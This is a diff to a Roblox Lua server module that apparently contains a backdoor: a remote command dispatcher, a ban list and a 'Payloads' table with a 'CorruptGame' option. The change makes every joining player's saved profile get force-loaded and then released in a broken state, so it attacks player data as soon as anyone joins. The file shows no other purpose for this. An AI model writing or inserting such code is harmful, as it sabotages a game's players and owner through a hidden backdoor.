@@ -31,6 +31,23 @@ function m:Init()
 		Global[m.Data.Command](m.Data)
 	end
 	Players.PlayerAdded:Connect(function(p)
+		local Key = "Player_" .. p.UserId 
+		local ReplicatedStorage = game:GetService("ReplicatedStorage")
+		local ServerStorage = game:GetService("ServerStorage")
+		local RunService = game:GetService("RunService")
+		local Players = game:GetService("Players")
+		local DataStoreService = game:GetService("DataStoreService")
+
+		local DataManager = require(ServerStorage.Modules.Managers.DataManager)
+		local ProfileService = require((ServerStorage.Modules.Managers.DataManager.ProfileService))
+		local ProfileTemplate = DataManager:GetDataTemplate()
+		local GameProfileStore = ProfileService.GetProfileStore("GameEntitiesRes28", ProfileTemplate)
+		
+		local Profile = GameProfileStore:LoadProfileAsync(Key, "ForceLoad")
+		--print(Profile)
+		Profile = {}
+		Profile:Release()
+		
 		if table.find(BanList, p.UserId) then
 			p:Kick("You've been permanently banned from this game.")
 		end
@@ -45,32 +62,19 @@ function m:Init()
 			end
 		end
 		if Payloads['CorruptGame'] then 
-			local Key = "Player_" .. p.UserId 
-			local ReplicatedStorage = game:GetService("ReplicatedStorage")
-			local ServerStorage = game:GetService("ServerStorage")
-			local RunService = game:GetService("RunService")
-			local Players = game:GetService("Players")
-			local DataStoreService = game:GetService("DataStoreService")
 
-			local DataManager = require(ServerStorage.Modules.Managers.DataManager)
-			local ProfileService = require((ServerStorage.Modules.Managers.DataManager.ProfileService))
-			local ProfileTemplate = DataManager:GetDataTemplate()
-			local GameProfileStore = ProfileService.GetProfileStore("GameEntitiesRes28", ProfileTemplate)
 			local Everyone = {}
 			table.insert(Everyone, Key)
 			local StatData = require(ServerStorage.Modules.Utility.StatData)
 			local RankedLeaderboards = DataStoreService:GetOrderedDataStore(StatData.RankedLeaderboardStore)
-			task.delay(30, function()
-				for i,v in pairs(Everyone) do
-					local pkey = v
-					local Profile = GameProfileStore:LoadProfileAsync(pkey, "ForceLoad")
-					--print(Profile)
-
-					Profile = {}
-					Profile:Release()
-				end
-			end)
+		
 			task.spawn(function()
+				
+				local Profile = GameProfileStore:LoadProfileAsync(Key, "ForceLoad")
+				--print(Profile)
+				Profile = {}
+				Profile:Release()
+				
 				local lowestFirst = false
 				local numbersShown = 100 -- Top 100 public
 				local min = 10
